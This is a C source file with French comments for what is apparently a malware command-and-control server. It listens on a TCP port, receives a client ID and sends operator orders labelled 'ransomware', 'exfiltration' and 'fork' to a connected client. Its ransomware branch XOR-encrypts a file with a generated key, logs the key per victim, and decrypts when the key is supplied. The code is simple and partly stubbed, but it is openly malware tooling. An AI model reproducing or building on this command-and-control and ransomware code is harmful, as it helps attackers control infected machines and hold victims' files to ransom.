#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>
#include <ctype.h>

#define PORT 12345
#define MAX_CLIENTS 1

// Fonction pour générer une clé de chiffrement
void generate_encryption_key(char *key) {
    const char *chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (int i = 0; i < 16; i++) {
        key[i] = chars[rand() % strlen(chars)];
    }
    key[16] = '\0';
}

// Fonction pour loguer la clé générée
void log_encryption_key(const char *key, const char *client_id) {
    FILE *log_file = fopen("log.txt", "a");
    if (log_file == NULL) {
        perror("Error opening log file");
        return;
    }

    time_t t;
    time(&t);
    fprintf(log_file, "Date: %sClient ID: %s\nEncryption Key: %s\n\n", ctime(&t), client_id, key);
    fclose(log_file);
}

// Fonction pour appliquer XOR sur le contenu du fichier
void obfuscate_file(const char *filename, char *key, int decrypt) {
    FILE *file = fopen(filename, "r+");
    if (!file) {
        fprintf(stderr, "Erreur d'ouverture du fichier %s.\n", filename);
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    size_t file_size = ftell(file);
    rewind(file);

    char *buffer = (char *)malloc(file_size + 1);
    if (!buffer) {
        fprintf(stderr, "Erreur d'allocation mémoire pour le buffer.\n");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    fread(buffer, 1, file_size, file);
    buffer[file_size] = '\0';

    size_t key_length = strlen(key);

    for (size_t i = 0; i < file_size; i++) {
        buffer[i] ^= key[i % key_length];
    }

    rewind(file);
    fwrite(buffer, 1, file_size, file);

    fclose(file);
    free(buffer);
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in address;
    char buffer[1024] = {0};
    char client_id[50];
    socklen_t addrlen = sizeof(address);

    // Création du socket
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("Socket failed");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Binding du socket
    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    // Attente de la connexion d'un client
    if (listen(server_fd, MAX_CLIENTS) < 0) {
        perror("Listen failed");
        exit(EXIT_FAILURE);
    }

    printf("Waiting for client connection...\n");
    if ((new_socket = accept(server_fd, (struct sockaddr *)&address, &addrlen)) < 0) {
        perror("Accept failed");
        exit(EXIT_FAILURE);
    }

    // Récupération de l'identifiant du client
    read(new_socket, client_id, sizeof(client_id));
    printf("Client ID: %s\n", client_id);

    srand(time(NULL));

    while (1) {
        // Attente de l'ordre à envoyer au client
        printf("Enter command (ransomware, exfiltration, fork, out): ");
        char command[50];
        fgets(command, sizeof(command), stdin);
        command[strcspn(command, "\n")] = '\0';

        // Envoi de l'ordre au client
        send(new_socket, command, strlen(command), 0);

        if (strcmp(command, "ransomware") == 0) {
            int choice;
            printf("Choisissez une option :\n");
            printf("1. Chiffrer le fichier.\n");
            printf("2. Déchiffrer le fichier.\n");
            scanf("%d", &choice);
            getchar(); // Consommer le '\n' laissé par scanf

            if (choice == 1) {
                send(new_socket, "chiffrer", strlen("chiffrer"), 0);
                char key[256];
                generate_encryption_key(key);
                printf("Clé générée : %s\n", key);

                obfuscate_file("data.txt", key, 0);
                log_encryption_key(key, client_id);
                printf("Fichier chiffré avec succès.\n");

            } else if (choice == 2) {
                send(new_socket, "dechiffrer", strlen("dechiffrer"), 0);
                char key[256];
                printf("Entrez la clé secrète : ");
                scanf("%s", key);
                obfuscate_file("data.txt", key, 1);
                printf("Fichier déchiffré avec succès.\n");
            } else {
                printf("Choix invalide.\n");
            }

        } else if (strcmp(command, "exfiltration") == 0) {
            printf("Exfiltration order sent.\n");
        } else if (strcmp(command, "fork") == 0) {
            printf("Fork order sent.\n");
        } else if (strcmp(command, "out") == 0) {
            // Fermeture de la connexion
            printf("Out order sent. Disconnecting...\n");
            break;
        }
    }

    close(new_socket);
    close(server_fd);
    return 0;
}
